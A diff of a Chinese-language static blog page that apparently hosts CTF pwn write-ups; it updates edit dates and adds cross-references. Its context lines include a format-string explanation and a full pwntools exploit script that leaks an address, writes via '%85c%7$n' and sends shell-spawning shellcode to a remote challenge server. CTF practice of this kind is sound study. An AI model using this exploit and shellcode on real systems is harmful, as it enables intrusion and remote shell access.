@@ -253,7 +253,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-28 21:32:05" itemprop="dateModified" datetime="2021-03-28T21:32:05+08:00">2021-03-28</time>
+                <time title="Modified: 2021-03-29 23:18:12" itemprop="dateModified" datetime="2021-03-29T23:18:12+08:00">2021-03-29</time>
               </span>
 
           
@@ -278,6 +278,8 @@
 <p>GOT表（Global Offset Table）:存放libc真正功能性代码的地址，由这些地址构成的表。</p>
 <p>libc动态库：存放自带的可调用的功能性函数。</p>
 <img src="/2021/03/27/AD-level3/1.jpg" class>
+<h1 id="新增python、pwntools内容"><a href="#新增python、pwntools内容" class="headerlink" title="新增python、pwntools内容"></a>新增python、pwntools内容</h1><p>相关内容已经更新在“pwn用到的工具汇总”</p>
+
       
     </div>
 
@@ -391,7 +393,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-27 11:42:18" itemprop="dateModified" datetime="2021-03-27T11:42:18+08:00">2021-03-27</time>
+                <time title="Modified: 2021-03-29 23:12:13" itemprop="dateModified" datetime="2021-03-29T23:12:13+08:00">2021-03-29</time>
               </span>
 
           
@@ -418,6 +420,8 @@
 <p>接下来再次攻击时，往v2写入我们想要的地址，注意v2的变量是整形，同时send只能发送字符串。所以将想要写入的地址v3_add即[0]，但v3_add已经在之前就被转为整形，这里只要将它当初字符串发送即可。</p>
 <p>printf(“%85c%7$n”)会想偏移第7处，所存的地址指向的地址出，写入85（%85c相当于85个字符）。（详情见CGfsb）</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os =<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">47546</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;secret[0] is &quot;</span>)</span><br><span class="line">s0=io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">v3_addr=int(s0[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;What should your character&#x27;s name be:&quot;</span>,<span class="string">&quot;yy&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;So, where you will go?east or up?:&quot;</span>,<span class="string">&quot;east&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;go into there(1), or leave(0)?:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Give me an address&quot;</span>,str(v3_addr))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;And, you wish is:&quot;</span>,<span class="string">&quot;%85c%7$n&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;USE YOU SPELL&quot;</span>, shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>PS: shellcode的相关内容有在“pwn用到的工具汇总中更新，持续更新中”。</p>
+
       
     </div>
 
